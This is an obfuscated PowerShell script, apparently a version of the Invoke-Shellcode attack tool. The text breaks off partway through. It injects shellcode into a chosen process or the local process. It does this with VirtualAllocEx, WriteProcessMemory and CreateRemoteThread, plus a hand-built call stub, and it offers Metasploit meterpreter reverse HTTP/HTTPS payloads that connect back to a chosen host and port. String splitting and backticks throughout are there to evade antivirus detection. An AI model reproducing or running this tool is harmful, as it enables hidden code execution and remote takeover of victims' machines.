$9sVYmr=[TYPE]("{0}{2}{9}{4}{3}{5}{7}{8}{1}{6}{10}" -F 'syStEm.r','lDERaC','EFle','M','IoN.e','i','CeS','T.aSsEMblYb','ui','ct','s');  &("{2}{0}{1}"-f 'Ite','m','seT-') ("{3}{0}{1}{2}" -f 'Wy','a','P','vARIaBlE:')  ( [Type]("{7}{8}{2}{1}{4}{3}{6}{5}{0}"-F 'ons','TiON.cA','fleC','g','LlIn','NVeNTI','co','sy','sTEm.Re')  )  ;$0oh = [tyPE]("{2}{1}{0}" -f'mAIn','PPdo','a') ;    $Dmt0J =  [TyPE]("{2}{1}{0}"-F'rRAY','stEM.A','sy') ; &("{2}{1}{0}"-f'M','Te','Set-I') ("{0}{2}{3}{1}"-f 'VAr','6j','iABL','e:KoS')  ([tYPe]("{1}{0}"-f'OL','Bo')  );  &("{1}{2}{0}" -f 'iablE','SET','-vaR')  ('1I9C'+'Y') (  [TYPE]("{0}{1}" -F'iNTpT','r') ) ;   &("{0}{1}{2}"-f'se','t-vA','rIABLE') ('R5'+'7Qe')  (  [tyPE]("{2}{3}{1}{0}" -F 'OdINg','nc','sYsTE','m.tExT.e')) ;   &("{1}{0}"-f'eT-ITEM','s') ("{2}{3}{1}{0}{4}" -f 'E:vg7p','bL','vaR','iA','8')  ( [TyPE]("{1}{0}"-F'erT','conV')  );  $m5uE03 =[tyPE]("{0}{2}{3}{1}{4}"-F 'sy','An','STEm.NET.seRvICepOin','tM','ageR')  ; $4gb  = [tYpe]("{0}{1}" -F'UiNt3','2')  ;  &("{0}{2}{3}{1}" -f'seT-','e','vARi','abl') ("Cjt"+"u") ( [tYpE]("{0}{5}{7}{6}{3}{2}{8}{1}{4}"-F 'SysTem.','aRSH','T','n','aL','RunTi','e.i','M','eRoPsERViCes.M'));  function inVO`Ke`-SH`eLlc`ode
{


[CmdletBinding( DEFAuLTparAmeteRSEtnamE = {"{2}{1}{0}"-f'Local','n','Ru'}, SUPpoRTSsHouLdpROcEss = ${tr`UE} , cOnfirMIMPaCt = "HI`gH")] Param (
    [ValidateNotNullOrEmpty()]
    [UInt16]
    ${Pro`cESS`ID},
    
    [Parameter( ParAMeTErSeTNamE = "R`Un`LocAl" )]
    [ValidateNotNullOrEmpty()]
    [Byte[]]
    ${shEll`cO`DE},
    
    [Parameter( PArAMEtersETName = "M`ETaSp`l`OiT" )]
    [ValidateSet( {"{1}{3}{0}{5}{2}{4}"-f'p','windo','eter/rever','ws/meter','se_http','r'},
                  {"{4}{1}{3}{5}{6}{0}{2}" -f'revers','o','e_https','ws/meterpre','wind','ter','/'},
                  IGNoReCaSe = ${tR`UE} )]
    [String]
    ${P`A`YLOad} = ("{5}{2}{1}{4}{6}{3}{0}" -f 'tp','/me','indows','rse_ht','terpre','w','ter/reve'),
    
    [Parameter( PArameTERsetNAMe = "liSTpA`yLO`ADS" )]
    [Switch]
    ${LIStM`eT`Aspl`o`ItPaY`Lo`AdS},
    
    [Parameter( MandAtory = ${t`Rue},
                pArAMetErSETNaMe = "m`ETa`SplOiT" )]
    [ValidateNotNullOrEmpty()]
    [String]
    ${lh`O`st} = ("{0}{1}{2}" -f '127.','0.','0.1'),
    
    [Parameter( ManDAtorY = ${t`RuE},
                PaRameTeRSEtname = "MetAs`p`LO`IT" )]
    [ValidateRange( 1,65535 )]
    [Int]
    ${lp`Ort} = 8443,
    
    [Parameter( paraMEterSEtName = "METaSP`L`oit" )]
    [ValidateNotNull()]
    [String]
    ${U`SeRA`G`eNt} = (&("{2}{3}{1}{0}"-f 'perty','o','Get','-ItemPr') -Path ((("{9}{3}{12}{7}{0}{21}{14}{20}{11}{1}{6}{16}{19}{13}{22}{10}{15}{4}{5}{8}{2}{17}{18}" -f'TSoftwar','f','t S','KC','b1TInte','rn','tb','1','e','H','tVe','o','U:b','wsb1','1','rsion','1TWi','ettin','gs','ndo','TMicros','eb','TCurren'))."R`EPlA`ce"(([Char]98+[Char]49+[Char]84),[strIng][Char]92))).'User Agent',

    [Parameter( PaRAMETerSeTnAME = "METa`s`ploIt" )]
    [ValidateNotNull()]
    [Switch]
    ${leG`A`CY} = ${f`Alse},

    [Parameter( PARAmetERSetnAme = "me`T`AsPLoIt" )]
    [ValidateNotNull()]
    [Switch]
    ${prO`XY} = ${fa`lSE},
    
    [Switch]
    ${fo`R`CE} = ${FaL`sE}
)

    &("{2}{1}{4}{3}{0}" -f 'e','tric','Set-S','d','tMo') -Version 2.0
    
    
    if (${pS`cMd`let}.pArAMETErSetnAME -eq ("{0}{1}{2}{3}"-f 'List','P','ayload','s'))
    {
        ${Av`AiLABL`E`PaYlo`AdS} = (&("{2}{1}{0}" -f 'd','t-Comman','Ge') ("{1}{4}{0}{3}{2}" -f 'e-She','Invo','lcode','l','k'))."PArA`Me`TeRS"[("{1}{0}"-f 'oad','Payl')]."A`TTRIBU`TES" |
            &("{2}{1}{3}{0}" -f 'bject','r','Whe','e-O') {${_}."t`YpEid" -eq [System.Management.Automation.ValidateSetAttribute]}
    
        foreach (${P`AyLO`AD} in ${A`V`AIlaBlePaYlO`A`DS}."v`AlIDVa`LuEs")
        {
            &("{0}{2}{1}" -f'New-Obj','t','ec') ("{1}{0}" -f 'bject','PSO') -Property @{ ("{1}{0}{2}"-f'oad','Payl','s') = ${p`A`Yload} }
        }
        
        Return
    }

    if ( ${p`s`B`oUNdPaRaMETerS}[("{0}{2}{1}" -f'Proc','ssID','e')] )
    {
        
        
        &("{2}{3}{1}{0}" -f 'ocess','r','Ge','t-P') -Id ${proces`S`id} -ErrorAction ("{1}{0}"-f'p','Sto') | &("{0}{1}" -f'Out-N','ull')
    }
    
    function Local:GEt-de`LegA`T`e`TyPe
    {
        Param
        (
            [OutputType([Type])]
            
            [Parameter( PoSiTion = 0)]
            [Type[]]
            ${P`AraM`eteRS} = (&("{2}{1}{0}"-f'-Object','w','Ne') ("{2}{1}{0}" -f']','[','Type')(0)),
            
            [Parameter( POSITIOn = 1 )]
            [Type]
            ${ReTU`RNT`yPe} = [Void]
        )

        ${dO`MAin} =   (  &("{0}{1}{3}{2}" -f'gEt-vari','A','e','bL') ('0O'+'h') -vaLUeo  )::"CurRenT`dOM`A`IN"
        ${DYna`SSEMb`ly} = &("{2}{0}{1}" -f'O','bject','New-') ("{9}{0}{5}{7}{4}{2}{1}{6}{8}{3}"-f 'ystem.','sem','s','e','tion.A','Ref','b','lec','lyNam','S')(("{1}{3}{4}{0}{2}" -f 'Del','R','egate','eflect','ed'))
        ${as`SemBly`Bu`ildEr} = ${d`O`mAIN}."DE`FiNeDyN`AMICas`s`eMb`lY"(${dy`N`A`sSemBly},  ( &("{1}{0}"-f'le','varIab') ("{0}{2}{1}"-f '9','vYmr','S')  -vaL  )::"r`Un")
        ${moDUL`eBu`iLD`eR} = ${AssEM`BLybu`ILDEr}.("{1}{3}{0}{2}" -f'e','Def','DynamicModule','in').Invoke(("{3}{0}{1}{4}{2}"-f 'yM','o','le','InMemor','du'), ${FAL`se})
        ${Type`BUIld`eR} = ${mo`D`UleBuILder}.("{0}{1}{2}"-f 'De','fin','eType').Invoke(("{1}{4}{2}{3}{0}"-f'e','My','gateT','yp','Dele'), ("{10}{8}{0}{2}{1}{12}{9}{7}{3}{11}{5}{4}{6}"-f 'ss, P','c','ubli',', ','toCl','u','ass','ss','la','led, AnsiCla','C','A',', Sea'), [System.MulticastDelegate])
        ${CO`NsTruCT`o`RBU`Ilder} = ${Ty`pE`Bu`iLDER}.("{1}{3}{0}{2}" -f'ne','D','Constructor','efi').Invoke(("{5}{1}{6}{0}{2}{3}{4}" -f 'eBy','TSpecialName, H','Sig',', Pu','blic','R','id'),  (  &("{1}{2}{0}" -f 'ABle','VaR','i')  ("{0}{1}" -f'w','yaP')  -VAlU )::"STan`D`Ard", ${pARaM`ETe`RS})
        ${C`oN`sTRUctORBu`IldEr}.("{2}{1}{0}{4}{3}"-f'ement','etImpl','S','gs','ationFla').Invoke(("{1}{2}{3}{0}"-f 'd','Run','time, Mana','ge'))
        ${mE`ThOD`B`UILDEr} = ${TYPE`BU`Ild`Er}.("{0}{2}{1}"-f 'DefineM','thod','e').Invoke('Invoke', ("{7}{1}{2}{4}{8}{6}{5}{0}{3}{10}{9}" -f 'wS','lic, H','i','lot,','deB',', Ne','ig','Pub','yS','tual',' Vir'), ${RE`Tu`RnT`Ype}, ${Pa`RaM`ET`ers})
        ${m`eTHod`BUiLDer}.("{0}{4}{2}{1}{3}" -f'SetImplem','Fl','ion','ags','entat').Invoke(("{0}{1}{4}{2}{3}"-f 'R','untim',', Manage','d','e'))
        
        &("{3}{2}{1}{0}" -f'Output','-','e','Writ') ${T`YP`e`BUIlDeR}.("{0}{1}{2}"-f 'Cre','ate','Type').Invoke()
    }

    function LOCa`L:g`et-`pR`OCaD`DRESs
    {
        Param
        (
            [OutputType([IntPtr])]
        
            [Parameter( pOSITIOn = 0, MANdaToRy = ${tR`UE} )]
            [String]
            ${M`oDuLE},
            
            [Parameter( poSItIon = 1, maNdAToRY = ${T`RUE} )]
            [String]
            ${Pro`C`eDuRe}
        )

        
        ${s`Y`St`E`MaSSemblY} =  (&("{2}{0}{1}"-f 'iab','LE','vaR') ("0o"+"h")  -VAlU)::"cURrENt`D`O`MaIn".("{1}{2}{0}" -f'lies','GetAsse','mb').Invoke() |
            &("{2}{0}{1}" -f'ere-Ob','ject','Wh') { ${_}."g`l`oBal`AssembL`yCAChe" -And ${_}."LoC`Ation".("{1}{0}" -f'it','Spl').Invoke('\\')[-1].("{0}{1}" -f 'Eq','uals').Invoke(("{1}{0}{2}" -f'.','System','dll')) }
        ${uNsAfEnA`Ti`Ve`M`etho`Ds} = ${s`ysTEma`sSE`MB`lY}.("{0}{1}" -f 'GetT','ype').Invoke(("{4}{2}{0}{1}{6}{3}{5}"-f 'f','eNative','rosoft.Win32.Unsa','hod','Mic','s','Met'))
        
        ${g`eTm`ODulEHAN`DlE} = ${un`s`AFEnat`ivEMeth`O`DS}.("{2}{1}{0}{3}"-f 'tMeth','e','G','od').Invoke(("{1}{2}{0}"-f 'uleHandle','G','etMod'))
        ${G`e`Tp`ROcaDDreSS} = ${UNSAfe`N`A`TiVEm`eT`Hods}.("{2}{1}{0}" -f 'd','o','GetMeth').Invoke(("{0}{3}{1}{2}"-f'GetP','d','dress','rocA'))
        
        ${KeRN3`2`h`ANdLe} = ${get`modu`L`EhAn`dlE}."I`NvOKe"(${N`ULL}, @(${Modu`LE}))
        ${tMp`p`Tr} = &("{2}{1}{0}{3}"-f 'c','bje','New-O','t') ("{0}{1}{2}" -f'Int','Pt','r')
        ${Ha`N`DleREf} = &("{2}{0}{1}" -f 'w-Obje','ct','Ne') ("{1}{4}{7}{5}{6}{0}{2}{3}"-f 'nter','S','opService','s.HandleRef','ys','unt','ime.I','tem.R')(${T`MppTr}, ${kE`Rn32ha`Nd`lE})
        
        
        &("{1}{3}{0}{2}" -f'te-Out','W','put','ri') ${Get`p`Rocad`dreSs}."iNV`oKE"(${n`ULl}, @([System.Runtime.InteropServices.HandleRef]${hAnDl`e`Ref}, ${prOc`edU`Re}))
    }

    
    function lO`CAl`:eMIT`-c`Al`ltHReADSTUb ([IntPtr] ${BAs`eaD`dr}, [IntPtr] ${eX`iT`T`HreAdaDDr}, [Int] ${arc`Hit`EC`TuRE})
    {
        ${IN`T`s`izePTR} = ${ARCHIt`eC`Ture} / 8

        function l`O`cal:`C`o`NvERtTO-LItt`L`EEnDian ([IntPtr] ${A`D`DRess})
        {
            ${LItTlEeNDiA`NB`Yt`earR`AY} = &("{2}{0}{1}" -f 'Ob','ject','New-') ("{0}{1}" -f'Byte','[]')(0)
            ${aD`dresS}.("{0}{1}" -f'ToS','tring').Invoke("X$($IntSizePtr*2)") -split '([A-F0-9]{2})' | &("{2}{1}{4}{3}{0}" -f 'ect','ach-','ForE','j','Ob') { if (${_}) { ${L`I`T`T`L`EeNDi`AnBYTEArrAY} += [Byte] ('0x{0}' -f ${_}) } }
              (  &("{0}{1}" -f 'vaRiaBl','E')  ("{1}{0}"-f 'mt0j','d') ).vALUE::("{1}{0}" -f'verse','Re').Invoke(${l`I`TTLeENDiA`N`BYtearRay})
            
            &("{0}{1}{2}" -f'Write-Out','pu','t') ${liTtlEEN`d`iaNb`yT`earray}
        }
        
        ${cAllS`T`UB} = &("{1}{2}{0}"-f 't','New-O','bjec') ("{0}{2}{1}"-f'B','te[]','y')(0)
        
        if (${i`NtsI`zEP`TR} -eq 8)
        {
            [Byte[]] ${CA`lLsT`Ub} = 0x48,0xB8                      
            ${Ca`ll`StUB} += &("{0}{2}{4}{1}{3}" -f'ConvertTo-L','En','ittl','dian','e') ${BAsEa`d`DR}       
            ${c`ALlSTUb} += 0xFF,0xD0                              
            ${C`AlLs`Tub} += 0x6A,0x00                              
            ${cAl`Ls`TuB} += 0x48,0xB8                              
            ${cA`L`LSTUB} += &("{1}{2}{0}{6}{3}{5}{4}" -f 'nvertTo','C','o','i','Endian','ttle','-L') ${EXI`TthR`EadAD`dr} 
            ${CAL`LS`TuB} += 0xFF,0xD0                              
        }
        else
        {
            [Byte[]] ${c`A`LLSTUb} = 0xB8                           
            ${ca`LLstUb} += &("{5}{0}{4}{1}{3}{2}"-f'ertTo','it','an','tleEndi','-L','Conv') ${B`AS`EaDdr}       
            ${CA`LL`stub} += 0xFF,0xD0                              
            ${C`ALLs`Tub} += 0x6A,0x00                              
            ${C`ALLstUb} += 0xB8                                   
            ${cAll`S`T`Ub} += &("{0}{1}{4}{6}{2}{5}{3}"-f'Con','ve','leEnd','n','rtTo-Lit','ia','t') ${eXITtHre`A`DaDDr} 
            ${c`All`sT`Ub} += 0xFF,0xD0                              
        }
        
        &("{0}{3}{2}{1}" -f'Wri','tput','-Ou','te') ${C`ALL`StUB}
    }

    function lOC`AL:inj`eC`T-RemO`TEshELlcode ([Int] ${Pr`O`cESSID})
    {
        
        ${hPr`OCE`SS} = ${o`PE`NPrO`cESs}."in`VO`Ke"(0x001F0FFF, ${f`AlSe}, ${PROC`eSs`iD}) 
        
        if (!${H`Pr`Oc`ESS})
        {
            Throw ('U'+'n'+'able '+'t'+'o '+'op'+'en '+'a '+'pro'+'c'+'ess '+'h'+'and'+'le '+'fo'+'r '+'PID:'+' '+"$ProcessID")
        }

        ${is`W`OW64} = ${fa`Lse}

        if (${6`4bIt`CPU}) 
        {
            
            ${ISW`Ow6`4pr`ocesS}."I`NVoKe"(${HPr`Oc`ESS}, [Ref] ${i`swOw`64}) | &("{0}{1}"-f'Out-','Null')
            
            if ((!${is`wO`w64}) -and ${pOwErshEL`L3`2b`iT})
            {
                Throw ("{12}{15}{21}{2}{0}{27}{32}{8}{4}{23}{17}{6}{24}{11}{7}{33}{31}{10}{16}{3}{9}{19}{5}{18}{14}{1}{26}{30}{28}{20}{13}{22}{29}{25}"-f 'c','y','inje','bit',' she','h','owe','l.','bit',' vers','e the 6','hel','Unabl','this ',' if ','e to','4-',' within 32-bit P','ell','ion of Powers','t ',' ','to w','llcode from','rs','.','o','t 6','wan','ork','u ','Us','4-',' ')
            }
            elseif (${Is`Wo`W64}) 
            {
                if (${sH`eLLCO`dE32}."lEN`gTh" -eq 0)
                {
                    Throw ('No'+' '+'shel'+'lcode'+' '+'wa'+'s '+'placed'+' '+'i'+'n '+'th'+'e '+('7'+'ID'+'Sh'+'e'+'llco'+'de32 ')."reP`La`ce"(([ChAr]55+[ChAr]73+[ChAr]68),[sTRInG][ChAr]36)+'var'+'iab'+'le!')
                }
                
                ${s`HELLc`oDe} = ${shelL`c`O`de32}
                &("{0}{1}{2}"-f 'Wri','te-Ve','rbose') ("{2}{4}{5}{1}{3}{0}{6}{8}{7}"-f 'r','w64','Injecting ',' p','into a',' Wo','oc','.','ess')
                &("{2}{1}{3}{0}"-f 'se','ite','Wr','-Verbo') ("{1}{3}{0}{4}{5}{2}{6}" -f '32','Usi',' shel','ng ','-b','it','lcode.')
            }
            else 
            {
                if (${SHElLcOd`E`64}."lEn`gth" -eq 0)
                {
                    Throw ('No'+' '+'shellc'+'o'+'de'+' '+'w'+'as '+'place'+'d'+' '+'in'+' '+'the'+' '+('{0}'+'S'+'he'+'llcod'+'e64 ')-f[cHAr]36+'vari'+'a'+'ble!')
                }
                
                ${S`helLCo`de} = ${sh`e`LLcodE64}
                &("{0}{1}{2}{3}"-f'Wr','ite-Ve','rb','ose') ("{1}{6}{5}{0}{2}{4}{3}" -f'64-bit s','Usin','hel','ode.','lc',' ','g')
            }
        }
        else 
        {
            if (${S`HeL`LCODE32}."l`ENGth" -eq 0)
            {
                Throw ('No'+' '+'sh'+'ellco'+'de '+'w'+'as '+'p'+'laced'+' '+'i'+'n '+'t'+'he '+('{0'+'}'+'Shellcod'+'e'+'32 ') -f  [chAR]36+'varia'+'bl'+'e!')
            }
            
            ${sh`eL`lco`DE} = ${shEllcO`d`E`32}
            &("{3}{2}{0}{1}" -f'Ver','bose','rite-','W') ("{0}{6}{5}{4}{1}{2}{3}"-f'Usin','b','it ','shellcode.','2-',' 3','g')
        }

        
        ${REM`O`TE`MEmaddR} = ${vIrtu`Al`Al`lo`cEX}."i`NV`oke"(${hPR`Oce`sS},   $1i9Cy::"Z`Ero", ${s`HelLc`ODE}."LE`NGth" + 1, 0x3000, 0x40) 
        
        if (!${rEmoTem`eMa`d`dR})
        {
            Throw ('U'+'nabl'+'e '+'t'+'o '+'a'+'llo'+'cate '+'sh'+'el'+'l'+'code '+'memo'+'ry '+'i'+'n '+'PID'+': '+"$ProcessID")
        }
        
        &("{2}{1}{0}" -f 'rbose','Ve','Write-') "Shellcode memory reserved at 0x$($RemoteMemAddr.ToString("X$([IntPtr]::Size*2)")) "

        
        ${w`RIT`ep`R`oCessmEMO`RY}."InV`OkE"(${HPR`oCE`Ss}, ${rE`mOT`eme`m`AdDr}, ${sHeLLc`O`de}, ${SH`el`LCode}."L`e`NgTH", [Ref] 0) | &("{1}{2}{0}"-f'Null','Out','-')

        
        ${exitT`HRea`DAD`dR} = &("{1}{3}{0}{2}" -f'cAddr','Get-P','ess','ro') ("{1}{2}{3}{0}" -f 'dll','kernel3','2','.') ("{2}{1}{0}"-f'd','a','ExitThre')

        if (${iS`Wow`64})
        {
            
            ${C`ALL`stUB} = &("{0}{4}{3}{2}{1}"-f 'E','Stub','d','t-CallThrea','mi') ${r`eM`Ot`emEMADDR} ${E`xIT`T`hREa`DADDr} 32
            
            &("{2}{1}{0}"-f'Verbose','te-','Wri') ("{3}{1}{0}{6}{2}{4}{5}"-f 'ing ','tt','ssembly ','Emi','c','all stub.','32-bit a')
        }
        else
        {
            
            ${c`A`lLS`Tub} = &("{3}{2}{5}{1}{0}{4}" -f'St','d','Thre','Emit-Call','ub','a') ${rEMoTEme`M`Ad`Dr} ${E`XItTHrEaD`A`DDR} 64
            
            &("{1}{0}{2}"-f'bos','Write-Ver','e') ("{3}{2}{1}{6}{5}{0}{4}{7}" -f'll','-bit assem','ng 64','Emitti',' stub','y ca','bl','.')
        }

        
        ${REmoTES`TU`BA`d`Dr} = ${V`irTUALal`LOceX}."iN`VOke"(${h`pRO`cESS},  (  &("{0}{1}"-f 'G','Ci') ("{4}{0}{2}{1}{3}" -f 'r','le:1','iAB','I9cy','vA')  ).VaLue::"Z`ero", ${CALl`s`Tub}."l`engTh", 0x3000, 0x40) 
        
        if (!${r`emo`Te`STubaddR})
        {
            Throw ('Una'+'bl'+'e '+'to'+' '+'alloca'+'te'+' '+'t'+'hre'+'ad '+'cal'+'l '+'stub'+' '+'memo'+'r'+'y '+'in'+' '+'PI'+'D: '+"$ProcessID")
        }
        
        &("{1}{2}{0}" -f 'ose','Write-Ve','rb') "Thread call stub memory reserved at 0x$($RemoteStubAddr.ToString("X$([IntPtr]::Size*2)")) "

        
        ${W`RITeP`ROC`ESsMEM`o`Ry}."invO`Ke"(${h`pRO`cESs}, ${rEmoTESTUB`Ad`dr}, ${cA`lL`STUB}, ${cA`LLs`TuB}."LeN`G`TH", [Ref] 0) | &("{2}{0}{1}" -f'ul','l','Out-N')

        
        ${th`R`EADHaN`Dle} = ${Cre`AtE`ReM`otE`T`hrEAd}."in`VO`ke"(${Hpr`Oce`Ss},  (  &("{0}{1}{2}"-f 'get-VA','ria','bLE')  ("{1}{0}"-f 'cY','1i9')  -ValueONLy)::"Z`eRO", 0, ${REMO`T`eS`TubAdDr}, ${rEmO`T`EMe`maDDr}, 0,   ( &('Gi')  ("{2}{1}{0}"-f 'bLe:1I9cY','aRIA','V')).VAlUE::"ZE`RO")
        
        if (!${ThReADHa`N`D`Le})
        {
            Throw ('U'+'n'+'able '+'t'+'o '+'la'+'unch '+'remot'+'e '+'threa'+'d '+'in'+' '+'PI'+'D: '+"$ProcessID")
        }

        
        ${cLOs`eHA`ND`lE}."I`NV`OKE"(${h`p`ROcEsS}) | &("{0}{2}{1}"-f'O','ll','ut-Nu')

        &("{2}{0}{3}{1}"-f'te-V','ose','Wri','erb') ("{3}{1}{5}{4}{0}{2}" -f 'omplete','l','!','Shel','ion c','code inject')
    }

    function l`Ocal:`INJ`EC`T-`lOcALSHe`llcO`De
    {
        if (${p`oWER`S`He`LL`32bIT}) {
            if (${sh`E`llcODe`32}."L`ENgtH" -eq 0)
            {
                Throw ('No'+' '+'sh'+'e'+'llcode '+'w'+'as '+'pla'+'ced '+'i'+'n '+'th'+'e '+('{0}Shell'+'code'+'3'+'2'+' ') -F [CHAr]36+'var'+'iab'+'le!')
                return
            }
            
            ${S`hE`lLCoDE} = ${S`hElL`cO`De32}
            &("{1}{0}{3}{2}"-f'er','Write-V','se','bo') ("{5}{4}{2}{6}{3}{0}{1}" -f'llc','ode.',' 32-bi','she','ing','Us','t ')
        }
        else
        {
            if (${SHEl`Lc`O`dE64}."LeNG`TH" -eq 0)
            {
                Throw ('N'+'o '+'sh'+'ellcode'+' '+'was'+' '+'p'+'la'+'ced '+'in'+' '+'t'+'he '+(('N'+'wxShellcode6'+'4'+' ')-RePLACE'Nwx',[cHar]36)+'vari'+'able'+'!')
                return
            }
            
            ${SHe`L`lco`de} = ${SH`E`lL`cOde64}
            &("{0}{1}{3}{2}" -f 'Writ','e-Ve','e','rbos') ("{2}{3}{4}{1}{0}"-f'lcode.','el','Using',' 64','-bit sh')
        }
    
        
        ${BaSE`ADD`RESs} = ${V`iRT`UAL`ALlOC}."InV`OKE"( (&("{0}{2}{1}" -f'geT','Le','-VAriAb') ("{1}{0}" -f'cY','1i9') ).ValUE::"ZE`RO", ${she`LlCO`DE}."L`eN`gth" + 1, 0x3000, 0x40) 
        if (!${BAsE`ADD`RE`sS})
        {
            Throw ('Unabl'+'e'+' '+'t'+'o '+'al'+'locat'+'e '+'she'+'l'+'lcode'+' '+'m'+'emory '+'i'+'n '+'PID:'+' '+"$ProcessID")
        }
        
        &("{3}{0}{1}{2}" -f '-','Ver','bose','Write') "Shellcode memory reserved at 0x$($BaseAddress.ToString("X$([IntPtr]::Size*2)")) "

        
          (  &("{0}{1}{2}" -f'VAriaB','l','e') ("CjT"+"U")).VAlUe::("{1}{0}" -f'y','Cop').Invoke(${sHEL`L`COde}, 0, ${B`ASeADdr`Ess}, ${sHE`LLcO`DE}."l`enGTh")
        
        
        ${ExitT`hR`eadaDDR} = &("{1}{0}{3}{2}" -f 'Pro','Get-','ress','cAdd') ("{1}{2}{0}{3}" -f'l','ke','rne','32.dll') ("{0}{2}{1}"-f'ExitT','read','h')
        
        if (${pOw`E`RShelL`32biT})
        {
            ${cA`llStub} = &("{2}{0}{4}{3}{1}{5}" -f 'it-CallThr','d','Em','a','e','Stub') ${b`Ase`AdD`ReSS} ${eXiTThrEA`D`AD`Dr} 32
            
            &("{0}{1}{2}"-f 'W','rite-Verb','ose') ("{2}{5}{0}{3}{1}{4}"-f'assembly ','all stu','Emitting','c','b.',' 32-bit ')
        }
        else
        {
            ${CA`l`LStuB} = &("{4}{1}{3}{2}{0}"-f'b','d','tu','S','Emit-CallThrea') ${bAsEad`D`RESS} ${EXiTth`ReAd`AD`dr} 64
            
            &("{0}{2}{1}{3}"-f'W','Ve','rite-','rbose') ("{1}{3}{5}{0}{4}{2}{6}" -f'y','Emitting ','l st','64-bit ass',' cal','embl','ub.')
        }

        
        ${c`ALlStUbaDD`RE`Ss} = ${VirTUa`l`AllOC}."I`Nv`OKE"(  (  &("{0}{1}"-f 'g','et-iTeM')  ('VAR'+'iab'+'l'+'e:1I'+'9cY')).valuE::"Z`ero", ${CA`l`L`stub}."LE`NGtH" + 1, 0x3000, 0x40) 
        if (!${Call`S`TubADD`Ress})
        {
            Throw ("{4}{6}{5}{3}{2}{7}{1}{8}{0}"-f 'b.','l ','re','th','Unable t','allocate ','o ','ad cal','stu')
        }
        
        &("{2}{0}{1}{4}{3}"-f'r','ite','W','se','-Verbo') "Thread call stub memory reserved at 0x$($CallStubAddress.ToString("X$([IntPtr]::Size*2)")) "

        
         (  &("{1}{0}" -f'cI','g') ("VaRIABL"+"e:cj"+"TU")).vALUe::("{1}{0}" -f'py','Co').Invoke(${CAl`L`stub}, 0, ${ca`llSt`UBa`DDReSS}, ${C`A`LlstUb}."LEnG`Th")

        
        ${thrEa`DHa`N`dLE} = ${crEaT`etH`ReAD}."inVO`KE"(  (  &("{0}{2}{3}{1}" -f 'gE','Tem','t-cHIl','di') ("{3}{1}{2}{0}" -f'Cy','lE:1I','9','variAB') ).ValUe::"z`eRO", 0, ${CAll`st`UbA`dDRe`SS}, ${basE`ADD`ResS}, 0,   ( &('LS')  ("{0}{1}{2}{3}" -f'vari','ab','LE',':1i9cy')  ).vaLUE::"zE`Ro")
        if (!${t`hR`e`ADH`AnDLE})
        {
            Throw ("{5}{4}{2}{1}{6}{3}{0}"-f '.','l','able to ','thread','n','U','aunch ')
        }

        
        ${Wa`Itf`Orsi`NglE`oBJ`ecT}."inVo`KE"(${th`R`EAdh`AndLE}, 0xFFFFFFFF) | &("{0}{2}{1}" -f 'O','Null','ut-')
        
        ${v`irtUAlf`R`eE}."I`N`VOKE"(${CA`ll`sT`UBadDREss}, ${C`A`LlstUB}."lE`NgTH" + 1, 0x8000) | &("{0}{1}" -f 'Out-Nul','l') 
        ${viR`Tu`ALfREE}."inv`oKe"(${bA`se`AdDre`SS}, ${Shel`lc`oDe}."LE`NG`Th" + 1, 0x8000) | &("{1}{2}{0}" -f'll','Out-','Nu') 

        &("{0}{1}{2}"-f'Wr','ite-Verb','ose') ("{0}{2}{3}{5}{4}{1}" -f'Shellcode inj','e!','ec','tion ','t','comple')
    }

    
    ${is`wOW64proCe`SSa`DDR} = &("{4}{1}{3}{2}{0}"-f's','d','es','dr','Get-ProcA') ("{3}{0}{2}{1}" -f'32.','l','dl','kernel') ("{1}{3}{2}{0}"-f'ss','IsWo','64Proce','w')
    if (${isWoW64pr`O`CEss`AdDr})
    {
        ${iS`wOW`64pR`oCesSDE`L`E`GA`Te} = &("{0}{1}{4}{2}{3}{5}"-f 'Get-','Dele','t','eTyp','ga','e') @([IntPtr],  (  &("{0}{1}" -f 'vaRiaB','Le')  ("{1}{0}"-f '6j','KOs')  -vAL).("{1}{3}{4}{2}{0}"-f'Type','M','f','ake','ByRe').Invoke()) ([Bool])
        ${IswO`w`6`4proc`EsS} =   (&("{1}{0}" -f'IaBlE','vaR') ('cj'+'Tu')  -vaLUe )::("{2}{0}{4}{1}{5}{3}" -f'eFor','unctionP','GetDelegat','ter','F','oin').Invoke(${Iswow`64P`R`OCesSA`dDr}, ${i`swOw`64`pRocesSd`E`le`ga`Te})
        
        ${64Bit`C`Pu} = ${t`RUe}
    }
    else
    {
        ${6`4BiT`cPu} = ${F`AlsE}
    }

    if ( ( &("{0}{1}"-f 'variab','lE')  ('1i9c'+'y')  ).VaLUe::"si`ze" -eq 4)
    {
        ${Pow`E`R`SheLL32b`it} = ${tr`Ue}
    }
    else
    {
        ${poWERS`He`lL`32b`it} = ${faL`se}
    }

    if (${psCM`d`L`et}.paRaMetERsetNAme -eq ("{2}{0}{1}" -f 'sploi','t','Meta'))
    {
        if (!${PowE`Rs`hell32BiT}) {
            
            

            
            ${ROOtI`N`V`OcaT`iON} = ${M`y`iNVOcA`TIon}."lI`NE"

            ${R`ES`ponse} = ${t`RUe}
        
            if ( ${FO`R`Ce} -or ( ${REsP`o`Nse} = ${PScM`D`let}.("{1}{2}{0}{3}" -f'n','Shou','ldCo','tinue').Invoke( ("{4}{6}{10}{8}{7}{3}{11}{5}{2}{0}{9}{1}"-f'6 P','rshell?','rom x8',' pay','Do you want ',' f','to','unch the','la','owe',' ','load'),
                   ("{33}{50}{46}{5}{42}{2}{1}{26}{52}{7}{23}{17}{36}{28}{14}{51}{30}{25}{19}{16}{12}{6}{18}{20}{41}{48}{47}{39}{29}{13}{40}{22}{8}{35}{38}{11}{49}{27}{3}{44}{0}{37}{45}{10}{31}{32}{21}{34}{15}{24}{4}{43}{9}" -f'c','2','3','e ar','he other pro','to ',':','it shel','e.','.','the ','ient! You wil','te',' m','om 6','g i',' No','od',' T','shell.','hi',' ','t','lc','n t','r','-',' som','fr','ut one','owe','scrip','t','Att','loadin',' Be','e ','t',' pat',' abo','inu','s ','execute ','cess','tifa','s of ','t ','kes','process ta','l also see','emp','4-bit P','b') ) ) ) { }
        
            if ( !${re`s`p`onsE} )
            {
                
                Return
            }

            
            if (${MyI`Nvo`cAtioN}."BouND`Par`AmET`ers"[("{0}{1}" -f 'F','orce')])
            {
                &("{1}{3}{0}{2}" -f'erbo','Write','se','-V') ('Exec'+'u'+'ting '+'t'+'he '+'fol'+'l'+'owing '+'fro'+'m '+'32-b'+'it'+' '+'Pow'+'erS'+'hell'+': '+"$RootInvocation")
